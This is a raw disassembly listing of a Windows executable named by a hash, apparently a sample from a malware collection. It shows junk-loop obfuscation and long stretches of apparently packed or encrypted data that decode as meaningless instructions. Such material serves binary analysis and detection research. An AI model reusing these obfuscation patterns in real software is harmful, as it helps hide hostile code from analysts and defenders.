
8a023c00fb40c9c51c2c491416c35007a9e9fae77409f96db7113e7e0315dc08.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [esi+0x7ef7ed08],bh
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [edi+0x0],esp
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x5757b739
  40126d:	add    al,0xa0
  40126f:	fidivr WORD PTR [ebx+0x3f9c5a00]
  401275:	add    ch,bh
  401277:	push   0x23eabfcf
  40127c:	mov    ebp,0x24957f78
  401281:	sub    ebx,ebp
  401283:	push   cs
  401284:	aam    0x81
  401286:	outs   dx,DWORD PTR ds:[esi]
  401287:	cmc    
  401288:	inc    eax
  401289:	mov    BYTE PTR [edi+0x1d3cd888],cl
  40128f:	js     0x4012d3
  401291:	int3   
  401292:	cmp    eax,DWORD PTR [edx+0xc]
  401295:	lods   al,BYTE PTR ds:[esi]
  401296:	daa    
  401297:	xor    ah,BYTE PTR [ebx+eiz*1-0x51]
  40129b:	(bad)  
  40129c:	push   cs
  40129d:	xchg   edi,eax
  40129e:	fst    QWORD PTR [edx+edi*4+0x1f]
  4012a2:	in     eax,dx
  4012a3:	pop    ecx
  4012a4:	sbb    BYTE PTR [ebx+0x2ab17652],dl
  4012aa:	xchg   ebx,eax
  4012ab:	or     eax,0x49819873
  4012b0:	add    al,0x87
  4012b2:	sbb    DWORD PTR [edi],esp
  4012b4:	pushw  ss
  4012b6:	inc    ebx
  4012b7:	scas   eax,DWORD PTR es:[edi]
  4012b8:	stos   BYTE PTR es:[edi],al
  4012b9:	push   ebp
  4012ba:	cld    
  4012bb:	icebp  
  4012bc:	mov    esp,0x898f9e89
  4012c1:	push   es
  4012c2:	cmc    
  4012c3:	call   0xcfec:0x3fb31229
  4012ca:	pop    es
  4012cb:	mov    bl,0x3f
  4012cd:	mov    ecx,0xb4475f3d
  4012d2:	mov    al,ds:0xb00014bb
  4012d7:	push   cs
  4012d8:	adc    bl,BYTE PTR [ecx+0x4eced7f1]
  4012de:	daa    
  4012df:	cmp    esi,DWORD PTR [ecx]
  4012e1:	or     al,0xb2
  4012e3:	xchg   BYTE PTR [eax],al
  4012e5:	mov    bh,0xb2
  4012e7:	jno    0x401314
  4012e9:	call   0xb9642fba
  4012ee:	jecxz  0x401344
  4012f0:	and    BYTE PTR ds:0xea57da79,dl
  4012f6:	adc    eax,eax
  4012f8:	mov    bl,0xc4
  4012fa:	push   0xffffffe0
  4012fc:	sbb    edx,DWORD PTR [edx]
  4012fe:	inc    edx
  4012ff:	pop    edx
  401300:	stc    
  401301:	and    ch,BYTE PTR [ebp-0x59]
  401304:	(bad)  [edi+ebp*4-0xd]
  401308:	jno    0x4012a2
  40130a:	pop    ebx
  40130b:	xchg   esi,eax
  40130c:	xchg   ecx,eax
  40130d:	clc    
  40130e:	mov    WORD PTR [ebx+eax*8-0x3b],gs
  401312:	(bad)  
  401313:	ins    BYTE PTR es:[edi],dx
  401314:	je     0x40134f
  401316:	sti    
  401317:	mov    bl,0x44
  401319:	sub    eax,DWORD PTR [edi+0x6523c90e]
  40131f:	cs pop edx
  401321:	(bad)  
  401322:	pusha  
  401323:	add    BYTE PTR [eax-0x2a],0xd6
  401327:	push   es
  401328:	mov    BYTE PTR [ebp+0x4f75ed5e],bh
  40132e:	xlat   BYTE PTR ds:[ebx]
  40132f:	or     BYTE PTR [edi-0x16576c5d],al
  401335:	dec    esp
  401336:	cld    
  401337:	mov    DWORD PTR ds:0x46fd52b7,0x6b8df2a1
  401341:	push   edx
  401342:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401343:	mov    esp,0x89c7f844
  401348:	inc    ebp
  401349:	hlt    
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	fs sti 
  4013b5:	into   
  4013b6:	mov    eax,ds:0x7e7e7ffa
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x401344
  4013c0:	iret   
  4013c1:	jb     0x401432
  4013c3:	xor    eax,0xd3e3d61
  4013c8:	xchg   ebx,ebx
  4013ca:	js     0x401380
  4013cc:	pop    ebx
  4013cd:	cld    
  4013ce:	inc    edx
  4013cf:	and    BYTE PTR [ecx+0x46],al
  4013d2:	inc    eax
  4013d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013d4:	sub    esi,DWORD PTR [eax+esi*8-0x5ba2d229]
  4013db:	and    DWORD PTR [eax-0x65],edx
  4013de:	sbb    BYTE PTR [ecx],ah
  4013e0:	jle    0x4013a3
  4013e2:	(bad)
  4013e5:	push   ebp
  4013e6:	retf   
  4013e7:	pop    esi
  4013e8:	(bad)  
  4013e9:	repz pop ebp
  4013eb:	cmp    DWORD PTR ds:0x7c505bfd,ebx
  4013f1:	or     dl,BYTE PTR [esi-0x35]
  4013f4:	and    DWORD PTR [ecx],edx
  4013f6:	popf   
  4013f7:	ins    DWORD PTR es:[edi],dx
  4013f8:	ins    BYTE PTR es:[edi],dx
  4013f9:	fcomp  st(2)
  4013fb:	push   edx
  4013fc:	xchg   ebp,eax
  4013fd:	add    DWORD PTR [ebp+edx*8-0x11df78d4],0xffffffe7
  401405:	iret   
  401406:	repz or BYTE PTR [edx],bh
  401409:	aas    
  40140a:	scas   al,BYTE PTR es:[edi]
  40140b:	sbb    DWORD PTR [edi],0x7a6985bc
  401411:	arpl   WORD PTR [ebx-0x31cdc411],ax
  401417:	outs   dx,DWORD PTR ds:[esi]
  401418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40141a:	call   0x20f9:0x775327
  401421:	adc    DWORD PTR ds:0x3bf12e4b,ebx
  401427:	mov    ds:0x378113e2,eax
  40142c:	mov    esp,0xdbfbfe02
  401431:	sti    
  401432:	gs retf 
  401434:	hlt    
  401435:	(bad)  
  401436:	xor    dh,BYTE PTR [ebp+0xf]
  401439:	fwait
  40143a:	sub    eax,0x3e403deb
  40143f:	data16 loop 0x401442
  401442:	xchg   ebx,eax
  401443:	mov    ds:0xced1b8cc,eax
  401448:	call   0x1ec2addf
  40144d:	mov    dh,0xea
  40144f:	das    
  401450:	dec    ecx
  401451:	mov    al,0xa4
  401453:	mov    dl,0xb2
  401455:	pop    ebx
  401456:	add    DWORD PTR [edx+0x292db51d],esp
  40145c:	xor    BYTE PTR [esi],0x2c
  40145f:	cs xchg ecx,eax
  401461:	or     ecx,DWORD PTR es:[esi-0x60c8648d]
  401468:	fbld   TBYTE PTR [ebx+0x6f1d3628]
  40146e:	jae    0x4014a7
  401470:	cwde   
  401471:	pop    eax
  401472:	xchg   esp,eax
  401473:	push   ds
  401474:	das    
  401475:	and    eax,0x1373adb
  40147a:	adc    BYTE PTR [edi-0x9],bh
  40147d:	arpl   WORD PTR [edi+0x5],ax
  401480:	sub    ch,BYTE PTR [esi]
  401482:	ja     0x401469
  401484:	push   edx
  401485:	(bad)  
  401486:	mov    eax,0xd2b4fa7e
  40148b:	test   BYTE PTR [esi+0x13],dl
  40148e:	fmul   st,st(3)
  401490:	push   esi
  401491:	inc    edi
  401492:	lds    ebx,FWORD PTR [esi]
  401494:	outs   dx,DWORD PTR ds:[esi]
  401495:	outs   dx,DWORD PTR ds:[esi]
  401496:	and    bl,ah
  401498:	push   es
  401499:	in     eax,dx
  40149a:	adc    al,0x6e
  40149c:	mov    ah,0x28
  40149e:	push   ss
  40149f:	bound  ebx,QWORD PTR [ebx-0x52]
  4014a2:	mov    BYTE PTR [esi-0x3ac61b70],bh
  4014a8:	lods   al,BYTE PTR ds:[esi]
  4014a9:	stos   BYTE PTR es:[edi],al
  4014aa:	xor    DWORD PTR ds:0xf040581,0xf0037de4
  4014b4:	or     ch,bh
  4014b6:	ja     0x401492
  4014b8:	xor    eax,0xde00d63a
  4014bd:	mov    edx,0x15905f2e
  4014c2:	push   edx
  4014c3:	hlt    
  4014c4:	push   ebx
  4014c5:	aas    
  4014c6:	jle    0x4014fb
  4014c8:	jnp    0x40146c
  4014ca:	sub    al,0xa7
  4014cc:	pmulhuw mm0,mm0
  4014cf:	dec    ebp
  4014d0:	gs retf 
  4014d2:	arpl   WORD PTR [ecx],bx
  4014d4:	out    0x59,eax
  4014d6:	dec    ecx
  4014d7:	cli    
  4014d8:	into   
  4014d9:	mov    al,0x11
  4014db:	fwait
  4014dc:	cwde   
  4014dd:	test   BYTE PTR [edi-0x4b],al
  4014e0:	mov    ds:0x7822f1bc,al
  4014e5:	or     ch,BYTE PTR [eax+eax*4+0x45]
  4014e9:	std    
  4014ea:	xor    eax,DWORD PTR [edi+0x79458f52]
  4014f0:	or     eax,0x9f13cff0
  4014f5:	bound  edx,QWORD PTR [esi]
  4014f7:	in     eax,0x96
  4014f9:	js     0x401555
  4014fb:	dec    edi
  4014fc:	xor    al,0xab
  4014fe:	and    eax,0xbd7cc557
  401503:	add    al,0x7f
  401505:	mov    bl,0xf9
  401507:	fwait
  401508:	jg     0x401502
  40150a:	lea    ebx,[esi]
  40150c:	loop   0x40156a
  40150e:	inc    esp
  40150f:	shl    BYTE PTR ds:0xdd567bad,0x5a
  401516:	test   BYTE PTR [edi-0x24b9dacd],0xbe
  40151d:	(bad)  
  40151e:	cld    
  40151f:	add    eax,0xf5a2800c
  401524:	test   eax,0xe6fedad
  401529:	jecxz  0x401536
  40152b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40152c:	rol    DWORD PTR [ecx-0x734c8c92],1
  401532:	jle    0x4015ab
  401534:	out    0xd6,eax
  401536:	inc    esi
  401537:	xchg   edx,eax
  401538:	sbb    DWORD PTR [ebx+eiz*8],esp
  40153b:	jno    0x4015a3
  40153d:	lea    esi,[ecx+0x2f7a5eb5]
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43370f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x218d25e3]
  401564:	inc    DWORD PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401527
  40156e:	sar    DWORD PTR [ebx],0xd5
  401571:	push   eax
  401572:	dec    esp
  401573:	and    al,0xb1
  401575:	sahf   
  401576:	ret    0xfe67
  401579:	xchg   edi,eax
  40157a:	imul   edi,DWORD PTR ds:0x571a1687,0x2188bf
  401584:	xchg   ebp,eax
  401585:	jbe    0x4015cf
  401587:	cld    
  401588:	and    eax,0xd76aafc5
  40158d:	sub    al,0xc6
  40158f:	jns    0x401525
  401591:	in     al,0xd3
  401593:	fdivr  DWORD PTR [edx]
  401595:	gs xchg ebp,eax
  401597:	push   edx
  401598:	gs xor al,0xc4
  40159b:	cmp    bl,BYTE PTR [edx+0x3b863256]
  4015a1:	je     0x401577
  4015a3:	xor    ebp,DWORD PTR [ebp-0x19065509]
  4015a9:	shl    DWORD PTR [eax-0x23],cl
  4015ac:	and    cl,0x15
  4015af:	dec    ebp
  4015b0:	xchg   BYTE PTR [ecx+ebx*8+0x203c415b],cl
  4015b7:	ins    DWORD PTR es:[edi],dx
  4015b8:	cmp    eax,0x56465c55
  4015bd:	or     al,0x66
  4015bf:	add    DWORD PTR [esp+edi*1+0x3d],0xaf973d44
  4015c7:	push   edx
  4015c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015c9:	pop    ebx
  4015ca:	stc    
  4015cb:	leave  
  4015cc:	retf   
  4015cd:	retf   
  4015ce:	leave  
  4015cf:	cs in  al,0x6c
  4015d2:	fstp   st(7)
  4015d4:	jecxz  0x4015f4
  4015d6:	dec    eax
  4015d7:	dec    edi
  4015d8:	je     0x401655
  4015da:	std    
  4015db:	pop    es
  4015dc:	push   es
  4015dd:	and    dh,dh
  4015df:	and    edx,eax
  4015e1:	mov    edx,0xeffb42b4
  4015e6:	sub    al,0x76
  4015e8:	mov    ds:0xea62e19f,eax
  4015ed:	xchg   esi,eax
  4015ee:	pop    esp
  4015ef:	push   eax
  4015f0:	mov    dh,BYTE PTR [ebp+0x3d]
  4015f3:	cmp    esp,DWORD PTR [ecx-0x51882caa]
  4015f9:	sbb    al,0x2b
  4015fb:	or     dh,dl
  4015fd:	cmp    BYTE PTR [esi],0x1
  401600:	sub    al,BYTE PTR [eax]
  401602:	hlt    
  401603:	xchg   edi,eax
  401604:	imul   esi,DWORD PTR [eax+0x19b14793],0xffffffad
  40160b:	nop
  40160c:	xchg   ebx,eax
  40160d:	call   0xfc47220b
  401612:	jge    0x401596
  401614:	retf   
  401615:	cmp    dh,ah
  401617:	push   0x159ec321
  40161c:	push   ss
  40161d:	ret    
  40161e:	xor    DWORD PTR [ebp+0x3606efbb],ecx
  401624:	jmp    0x47aa:0xcf9592ad
  40162b:	aad    0xef
  40162d:	icebp  
  40162e:	ror    BYTE PTR ds:0x877852af,0x61
  401635:	dec    eax
  401636:	outs   dx,DWORD PTR ds:[esi]
  401637:	aas    
  401638:	div    DWORD PTR [eax-0x7e3a9b52]
  40163e:	mov    bl,0x78
  401640:	xchg   ebp,eax
  401641:	mov    al,0x8f
  401643:	xor    al,0x57
  401645:	jb     0x4015d9
  401647:	lods   eax,DWORD PTR ds:[esi]
  401648:	pushf  
  401649:	icebp  
  40164a:	pop    eax
  40164b:	sbb    DWORD PTR [eiz*8+0x66e98e3],esp
  401652:	mov    eax,0xd016f2fa
  401657:	jle    0x401672
  401659:	xlat   BYTE PTR ds:[ebx]
  40165a:	popa   
  40165b:	imul   ebx,DWORD PTR [edi],0x54529d58
  401661:	outs   dx,BYTE PTR ds:[esi]
  401662:	in     al,dx
  401663:	jb     0x401672
  401665:	mov    edi,0x98e1b2ba
  40166a:	(bad)  
  40166c:	mov    DWORD PTR [eax],esi
  40166e:	inc    edi
  40166f:	adc    DWORD PTR [esi+0x76bed7a3],ebp
  401675:	mov    edi,0x7fa77e04
  40167a:	into   
  40167b:	loope  0x4016c4
  40167d:	sub    DWORD PTR [edi+edi*4],eax
  401680:	pop    ebx
  401681:	and    esp,ebp
  401683:	cs dec edx
  401685:	push   ss
  401686:	mov    eax,0x818ee53d
  40168b:	pusha  
  40168c:	sub    DWORD PTR [eax-0x6f072f86],esp
  401692:	sar    ecx,0x95
  401695:	adc    al,0x41
  401697:	daa    
  401698:	scas   eax,DWORD PTR es:[edi]
  401699:	xor    BYTE PTR [ebp+eax*1+0x2b],cl
  40169d:	push   edi
  40169e:	push   eax
  40169f:	leave  
  4016a0:	stc    
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	loope  0x4016f3
  4016a4:	mov    esi,0x4bac14f8
  4016a9:	loope  0x4016a8
  4016ab:	xchg   BYTE PTR [ecx],dl
  4016ad:	dec    eax
  4016ae:	leave  
  4016af:	(bad)  
  4016b0:	add    cl,BYTE PTR [esi]
  4016b2:	loop   0x401730
  4016b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016b5:	mov    eax,0x544678b0
  4016ba:	cs loop 0x40168e
  4016bd:	loopne 0x4016c5
  4016bf:	cwde   
  4016c0:	sub    DWORD PTR [edi+0x3d74d6c2],ebp
  4016c6:	fst    DWORD PTR [esi-0x6d]
  4016c9:	or     eax,0x2424f78c
  4016ce:	mov    eax,0x7f5a24ec
  4016d3:	xchg   ebp,eax
  4016d4:	and    DWORD PTR [ebp+0x35757448],esp
  4016da:	adc    BYTE PTR [ebp+ecx*8-0x1999d598],dh
  4016e1:	inc    esp
  4016e2:	fsub   DWORD PTR [ebx]
  4016e4:	jno    0x4016f0
  4016e6:	repnz mov esi,0x88f110f7
  4016ec:	daa    
  4016ed:	nop
  4016ee:	(bad)  
  4016f0:	cmp    BYTE PTR [ebx],al
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x55bb6ade
  4018e9:	xchg   ecx,eax
  4018ea:	call   0x7ffa:0x7e7e7a82
  4018f1:	jle    0x401971
  4018f3:	pop    esp
  4018f4:	in     al,dx
  4018f5:	(bad)  
  4018f6:	jno    0x40192e
  4018f8:	repnz in eax,dx
  4018fa:	aas    
  4018fb:	pop    eax
  4018fc:	pop    ecx
  4018fd:	scas   al,BYTE PTR es:[edi]
  4018fe:	(bad)  
  401900:	xchg   edi,eax
  401901:	pushf  
  401902:	std    
  401903:	dec    esp
  401904:	or     cl,dl
  401906:	retf   0xe1e7
  401909:	call   0xbac2ee3e
  40190e:	(bad)  
  40190f:	jecxz  0x401913
  401911:	mov    dh,0x93
  401913:	add    ch,BYTE PTR [eax-0x540f34ca]
  401919:	pop    ds
  40191a:	push   edx
  40191b:	das    
  40191c:	rcr    DWORD PTR [ebx+0x5e],0x2c
  401920:	pusha  
  401921:	lods   al,BYTE PTR ds:[esi]
  401922:	xchg   esp,edi
  401924:	add    BYTE PTR [eax-0xf],al
  401927:	arpl   WORD PTR [edi-0xd039775],bp
  40192d:	adc    DWORD PTR [edi-0x5baa4758],ebx
  401933:	adc    bh,BYTE PTR [edx-0x7f85e552]
  401939:	scas   eax,DWORD PTR es:[edi]
  40193a:	inc    eax
  40193b:	cs add edx,ebx
  40193e:	dec    esi
  40193f:	rol    BYTE PTR [edi+ebp*4],1
  401942:	out    0x4b,al
  401944:	or     edx,DWORD PTR [ecx]
  401946:	adc    edi,DWORD PTR [ebx+esi*2-0x7d80feb6]
  40194d:	sub    esp,eax
  40194f:	ret    0xa6b2
  401952:	jg     0x401980
  401954:	fidiv  WORD PTR [ebp-0x459fd356]
  40195a:	ret    0x778a
  40195d:	mov    BYTE PTR [esi-0x38],bh
  401960:	mov    ebp,DWORD PTR [esi-0x27]
  401963:	mov    ecx,0x17456b28
  401968:	xor    DWORD PTR [esi],ebx
  40196a:	cli    
  40196b:	cmp    BYTE PTR [ebp+ecx*2+0xa],bh
  40196f:	shl    DWORD PTR [esi],0x3d
  401972:	int    0x94
  401974:	add    al,0xe2
  401976:	js     0x401987
  401978:	xor    eax,0xaf374bd4
  40197d:	outs   dx,DWORD PTR ds:[esi]
  40197e:	pop    ss
  40197f:	adc    eax,0xef907a64
